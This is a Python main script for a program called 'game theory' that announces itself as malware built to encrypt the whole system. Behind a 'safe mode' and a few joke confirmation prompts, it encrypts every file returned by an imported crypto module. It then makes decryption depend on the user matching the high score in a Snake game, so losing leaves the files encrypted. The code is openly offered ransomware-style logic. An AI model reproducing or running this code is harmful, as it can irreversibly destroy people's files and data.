from gametheory.crypto import Crypto
from gametheory.game import SnakeGame
import time
import os

KEY_SIZE = 32
IV_SIZE = 16


def main():
    safemode = input(
        "Hello. Welcome to game theory.\nTHIS IS A MALWARE DESIGNED TO ENCRYPT YOUR WHOLE SYSTEM. Currrently it is operating in SAFE MODE, which means nothing will be encrypted. If you would like to turn safe mode OFF, type TURN OFF SAFE MODE and press ENTER. Otherwise, press [ENTER] ").lower() != 'turn off safe mode'
    files = []
    crypto = Crypto(KEY_SIZE, IV_SIZE)

    if not safemode:
        input(
            'YOU WILL LOSE EVERYTHING. PRESS [ENTER] IF YOU ARE OK WITH THIS ')
        script = input(
            "I don't believe you. Input the seventh word of the bee movie script below and press [ENTER] if you understand this\nHint: \"According to all known laws of aviation, there is no way that a bee should be able to fly\"\nThe word is: ").lower()
        if script.lower() == "aviation":
            files = crypto.get_files()

    print(files)
    input(
        "Press enter to forever encrypt the files printed above [ENTER] ")
    time.sleep(2)
    for f in files:
        try:
            if os.path.isfile(f):
                print("Encrypting: {}".format(f))
                crypto.encrypt_file(f)
        except Exception as e:
            print("Could NOT encrypt: {}".format(f))
    mygame = SnakeGame()
    if mygame.score == mygame.high_score:
        for f in files:
            try:
                if os.path.isfile(f):
                    print("Decrypting: {}".format(f))
                    crypto.decrypt_file(f)
            except Exception as e:
                print("Could NOT encrypt: {}".format(f))
    print("bye")


if __name__ == "__main__":
    main()
